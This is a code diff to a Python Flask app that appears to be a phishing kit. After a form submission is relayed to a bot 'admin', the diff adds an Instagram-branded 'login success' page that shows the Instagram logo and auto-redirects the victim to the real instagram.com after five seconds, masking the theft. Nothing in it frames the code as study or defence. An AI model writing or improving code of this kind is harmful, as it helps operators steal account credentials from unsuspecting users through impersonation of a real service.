@@ -534,7 +534,55 @@ def submit_form():
         logger.warning("Scheduling message to TARGET_ADMIN_ID failed. Check event loop and that the admin has started the bot.")
         return "<h3>⚠️ Could not send data to admin. Please notify the admin to start the bot.</h3>"
 
-    return "<h3>✅ You Have Logined Successfully!</h3><p>Thanks For Completing Now Click On (Instagram.com) 💗.</p>"
+    return """
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Login Success</title>
+  <style>
+    body {
+      background: #fafafa;
+      font-family: Arial, sans-serif;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      height: 100vh;
+    }
+    .container {
+      width: 350px;
+      background: #fff;
+      border: 1px solid #dbdbdb;
+      padding: 40px;
+      text-align: center;
+    }
+    .logo {
+      width: 120px;
+      margin-bottom: 20px;
+    }
+    h3 {
+      color: green;
+      margin-bottom: 10px;
+    }
+    p {
+      margin: 5px 0;
+    }
+  </style>
+  <!-- Auto redirect after 5 seconds -->
+  <meta http-equiv="refresh" content="5;url=https://www.instagram.com">
+</head>
+<body>
+  <div class="container">
+    <img src="https://upload.wikimedia.org/wikipedia/commons/a/a5/Instagram_icon.png" 
+         alt="App Logo" class="logo">
+    <h3>✅ Data sent to admin!</h3>
+    <p>You can close this tab.</p>
+    <p><b>Please wait, you are redirecting to Instagram Login in 5s...</b></p>
+  </div>
+</body>
+</html>
+"""
 
 # ---------- Status + placeholders ----------
 @flask_app.route("/status")
